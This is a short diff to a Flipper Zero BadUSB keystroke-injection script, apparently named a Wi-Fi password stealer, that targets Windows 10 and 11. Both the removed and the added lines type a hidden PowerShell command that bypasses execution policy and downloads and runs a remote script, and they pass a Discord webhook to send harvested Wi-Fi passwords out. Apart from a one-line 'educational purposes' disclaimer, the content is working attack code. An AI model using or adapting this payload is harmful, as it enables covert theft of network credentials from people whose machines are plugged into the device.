@@ -4,7 +4,7 @@ REM     To Get Discord Web URL Please visit https://github.com/wmlsandaruwan/
 REM     This script is for educational purposes only
 REM     Target: Windows 10, 11
 
+DELAY 2000
 GUI r
-DELAY 500
-STRING powershell -w h -NoP -Ep Bypass $dc='';irm github.com/wmlsandaruwan/FlipperZeroWifiPassStealer/blob/main/WifiPassStealer.ps1 | iex
-ENTER
+DELAY 250
+STRINGLN powershell -w h -ep bypass $discord='<your_webhook_here>';irm link.wmlsandaruwan.online/AllWiFiPassInOne | iex
